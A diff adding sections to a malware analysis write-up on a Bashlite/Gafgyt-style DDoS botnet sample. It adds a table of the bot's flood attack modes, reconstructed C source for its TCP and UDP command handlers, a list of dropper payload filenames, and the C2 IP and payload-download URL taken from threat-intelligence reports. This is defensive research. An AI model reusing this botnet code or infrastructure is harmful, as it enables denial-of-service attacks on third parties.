@@ -702,8 +702,46 @@ void processCmd(int param_count, char **params) {
 
 ---
 
+Attack method available in Bot123
+
+| Function Name          | Command | Description                                                                                   | Present in Recent Bashlite Forks |
+|-----------------------|---------|-----------------------------------------------------------------------------------------------|---------------------------------|
+| ftcp                  | TCP     | Customizable TCP flood attack                                                                | ✔                               |
+| SendUDP               | UDP     | UDP flood attack                                                                             | ✔                               |
+| vseattack             | VSE     | UDP amplification attack for Valve Source Engine game servers                               | ✔                               |
+| SendSTDHEX            | STDHEX  | Simple TCP flood attack with malformed hex payload                                          | ❌                              |
+| SendSTD               | STD     | Simple TCP flood attack                                                                      | ✔                               |
+| stdhexflood           | NFODROP | Simple TCP flood attack with large garbage payload                                          | ❌                              |
+| SendSTD_HEX           | OVHKILL | Simple TCP flood attack likely directed at DayZ game servers                                | ✔                               |
+| rtcp                  | XMAS    | Simple TCP flood attack with specific TCP flags set, resembling Xmas attack.                 | ✔                               |
+| astd and atcp         | CRUSH   | Attack combining simple TCP flood and customizable TCP flood.                               | ✔                               |
+| astd, atcp and audp   | STOMP   | Mixed flooding attack using simple/customizable TCP and UDP                                | ✔                               |
+| kill                  | STOP    | Stops all attacks                                                                            | ✔                               |
+
+
 
 ## Virus Total Report
+
+https://www.virustotal.com/gui/ip-address/45.11.229.181/relations Shows which files were communicating with this IP-Address. We can also observe in this list a shell script, sakura.sh.
+
+This script atempts to change its currecnt directory and then proceedes to download several files. These files are likely some of the payload that our bot is atempting to gather as well:
+
+```
+- 'm-i.p-s.Sakura`
+- `m-p.s-l.Sakura`
+- `s-h.4-.Sakura`
+- `x-8.6-.Sakura`
+- `a-r.m-6.Sakura`
+- `x-3.2-.Sakura`
+- `a-r.m-7.Sakura`
+- `p-p.c-.Sakura`
+- `i-5.8-6.Sakura`
+- `m-6.8-k.Sakura`
+- `a-r.m-4.Sakura`
+- `a-r.m-5.Sakura`
+```
+
+
 ## Dynamic Analysis
 ### Any.run Results
 The results of running the program on Any.run can be found [here](https://any.run/report/3b1be8499ec382dfafbc496a73dea2794f6dd201b3e46a4128c7fcd88e8c17c2/32322955-6166-4ee8-9440-baa59267c993), when using a proxy a slightly different result can be found [here](https://any.run/report/963a062aa8d6950fa219284859f9c6dc527eb69480b78fd614bd6959d604e7a1/e10b7092-359e-45eb-957a-d520ce6a8e28)
@@ -730,6 +768,169 @@ There are multiple command cases that this function deals with, based on the inp
 
 It has the ability to parse all the input commands and fork each command off into parallel helper functions that will actually execute what each command does.
 
+Bellow is a breakdown of each of the possible commands:
+
+#### TCP
+
+```c
+if (strcmp(commands[0], "TCP") == 0) {
+    //Ensure there are at least 6 tokens:
+    //commands[0] = "TCP"
+    //commands[1] = target(s)
+    //commands[2] = port
+    //commands[3] = thread count
+    //commands[4] = packet size
+    //commands[5] = payload
+    if (num_of_tokens < 6) {
+        return;
+    }
+
+    // comma-separated IP(s)
+    char *target_list   = commands[1];
+
+    // target TCP port           
+    int   port          = atoi(commands[2]);
+
+    // number of parallel threads     
+    int   thread_count  = atoi(commands[3]);
+
+    // size of each packet     
+    int   packet_size   = atoi(commands[4]);
+
+    // extra data to include in the packet     
+    char *payload       = commands[5];           
+
+    // If statement which controls duration in seconds, if none provided default to 10 seconds.
+    int duration = (num_of_tokens == 8) ? atoi(commands[7]) : 10;
+
+    // If statement which controls inter-packet delay in milliseconds, if none provided default to 0ms.
+    int delay = (num_of_tokens >= 7) ? atoi(commands[6]) : 0;
+
+    // Check how many targets have been selected for the attack, single vs multiple
+    char *commaPos = strchr(target_list, ',');
+    if (commaPos == NULL) {
+        // Single target case, also where listFork() is invoked which forks off the process to a child
+        int fork_result = listFork();
+        if (fork_result != 0) {
+            return;
+        }
+        // Child runs the flood after the fork
+        ftcp(target_list,
+             port,
+             thread_count,
+             packet_size,
+             payload,
+             delay,
+             duration);
+        _exit(0);
+    } else {
+        // Multiple target case.
+        char *target = strtok(target_list, ",");
+        while (target != NULL) {
+            // Starts forking off all the targets to a different child
+            int fork_result = listFork();
+            if (fork_result == 0) {
+                // Child handles its specific target
+                ftcp(target,
+                     port,
+                     thread_count,
+                     packet_size,
+                     payload,
+                     delay,
+                     duration);
+                _exit(0);
+            }
+            // Parent moves on to the next target
+            target = strtok(NULL, ",");
+        }
+    }
+}
+```
+
+#### UDP
+
+```c
+if (strcmp(commands[0], "UDP") == 0) {
+    //Ensure there are at least 6 tokens:
+    //commands[0] = "UDP"
+    //commands[1] = target(s)
+    //commands[2] = port
+    //commands[3] = thread count
+    //commands[4] = packet size
+    //commands[5] = duration
+    if (num_of_tokens < 6) {
+        return;
+    }
+
+    // comma-separated IP(s)
+    char *target_list   = commands[1];
+
+    // target UDP port
+    int   port          = atoi(commands[2]);
+
+    // number of parallel threads
+    int   thread_count  = atoi(commands[3]);
+
+    // size of each packet
+    int   packet_size   = atoi(commands[4]);
+
+    // If statement which controls duration in seconds, if none provided default to 10 seconds.
+    int duration = (num_of_tokens == 6) ? atoi(commands[5]) : 10;
+
+    // Check how many targets have been selected for the attack, single vs multiple
+    char *commaPos      = strchr(target_list, ',');
+    if (commaPos == NULL) {
+        // Single target case, also where listFork() is invoked which forks off the process to a child
+        int fork_result = listFork();
+        if (fork_result != 0) {
+            return;
+        }
+        // Child runs the flood after the fork
+        SendUDP(target_list,
+                port,
+                thread_count,
+                packet_size,
+                duration,
+                0x20);
+        _exit(0);
+    } else {
+        // Multiple target case.
+        char *target = strtok(target_list, ",");
+        while (target != NULL) {
+            // Starts forking off all the targets to a different child
+            int fork_result = listFork();
+            if (fork_result == 0) {
+                // Child handles its specific target
+                SendUDP(target,
+                        port,
+                        thread_count,
+                        packet_size,
+                        duration,
+                        0x20);
+                _exit(0);
+            }
+            // Parent moves on to the next target
+            target = strtok(NULL, ",");
+        }
+    }
+}
+```
+
 # Bot behaviour
+
+#### C2
+
+We can observe that ourbotnet atempts to communicate with the C2 server at 45.11.229.181:606. This is a known endpoint for Gafgyt botnet variants used for coordinated DDoS attacks. However this specific server seems to be unresponsive and offline currently as current atempts to communicate with it result in a timeout. 
+
+![Any.run](https://i.imgur.com/EkZ1fv2.jpeg) 
+
+Any.run dynamic analysis captures the packet sent out from our sample, we can recreate this packet and atempt to communicate with the C2 server however it ends up in a timeout which indicates the server is currently dead.
+
+![CMD test](https://i.imgur.com/9QCyN64.png) 
+
+
+https://threatfox.abuse.ch/ioc/1460615/ - Flags it as a botnet endpoint linked to the Bashlite malware.
+
+https://urlhaus.abuse.ch/url/3491280/ - Shows that ```http://45.11.229.181/a-r.m-6.Sakura``` was used to serve malware, probably the payload host.
 
 # Python Remake
